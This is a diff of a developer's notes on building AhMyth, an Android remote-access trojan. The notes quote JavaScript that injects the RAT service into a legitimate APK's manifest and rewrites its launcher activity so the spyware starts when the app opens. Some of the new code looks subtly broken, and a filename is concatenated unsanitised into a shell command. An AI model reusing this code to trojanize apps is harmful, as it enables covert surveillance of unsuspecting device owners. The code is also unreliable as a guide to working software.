@@ -167,31 +167,10 @@ Stop function for the AhMyth Listener | index.html = Line 69 |
 code utilising `unix "find"` command to find the correct launcher activity | AppCtrl.js | FINALLY FUCKING WORKS!!!!!
 need to implement ShellJS for cross-platform operation of this function now
 ```javascript
-
-            var launcherActivity = GetLauncherActivity(data, apkFolder);
-            if (launcherActivity == -1) {
-                $appCtrl.Log("Cannot find the launcher activity in the Manifest!", CONSTANTS.logStatus.FAIL);
-                $appCtrl.Log("Please Template Another APK.", CONSTANTS.logStatus.INFO);
-                $appCtrl.Log();
-                return;
-            }
-            
-            var ahmythService = CONSTANTS.ahmythService;
-            $appCtrl.Log('Modifying AndroidManifest.xml...');
-            $appCtrl.Log();
-            var permManifest = $appCtrl.copyPermissions(data);
-            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
-            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
-                if (error) {
-                    $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
-                    $appCtrl.Log();
-                    return;
-                }
-                
                 $appCtrl.Log("Locating Launcher Activity...")
                 $appCtrl.Log();
                 exec('find -name "' + launcherActivity + '"', { cwd: apkFolder }, (error, stdout, stderr) => {
-                  var launcherPath = path.join(apkFolder, stdout.substring(stdout.indexOf("./") + 2).trim("\n"));
+                  var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n");
                   if (error !== null) {
                       $appCtrl.Log("Cannot Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                       $appCtrl.Log('Please use the "On Boot" method', CONSTANTS.logStatus.INFO);
@@ -204,7 +183,7 @@ need to implement ShellJS for cross-platform operation of this function now
                     $appCtrl.Log();
                     $appCtrl.Log("Fetching Launcher Activity...")
                     $appCtrl.Log();
-                    fs.readFile(launcherPath, 'utf8', (error, data) => {
+                    fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                         if (error) {
                             $appCtrl.Log('Reading Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
                             $appCtrl.Log('Please use the "On Boot" method', CONSTANTS.logStatus.INFO);
@@ -212,14 +191,19 @@ need to implement ShellJS for cross-platform operation of this function now
                             $appCtrl.Log();
                             return;
                         }
-                        
-                        var startService = CONSTANTS.serviceSrc + launcherPath + CONSTANTS.serviceStart;
-                        
+
+                        var regex = /\/(\S+)\./;
+                        var str = (apkFolder, launcherPath);
+                        var m = str.match(regex);
+
+                        var startService = CONSTANTS.serviceSrc + apkFolder.split(apkFolder).join((m[1])) + CONSTANTS.serviceStart;
+
+
                         var key = CONSTANTS.orgAppKey;
                         $appCtrl.Log("Modifiying launcher activity...");
                         $appCtrl.Log();
                         var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
-                        fs.writeFile(launcherPath, output, 'utf8', (error) => {
+                        fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                             if (error) {
                                 $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
                                 $appCtrl.Log();
@@ -230,17 +214,20 @@ need to implement ShellJS for cross-platform operation of this function now
 
                         });
 
-
                     });
-                    
-              });
+
+                });
+                
+            });
 
         });
 
     }
-
-|---------------------------------------------|
-function GetLauncherActivity(manifest) {
+``` 
+new GetLauncherPath function for the new launcher location funtion
+```js
+//function to extract the launcher activity from the orginal app
+function GetLauncherPath(manifest) {
 
 
     var regex = /<activity/gi,
@@ -294,4 +281,4 @@ function GetLauncherActivity(manifest) {
 
 
   }
-``` 
+```
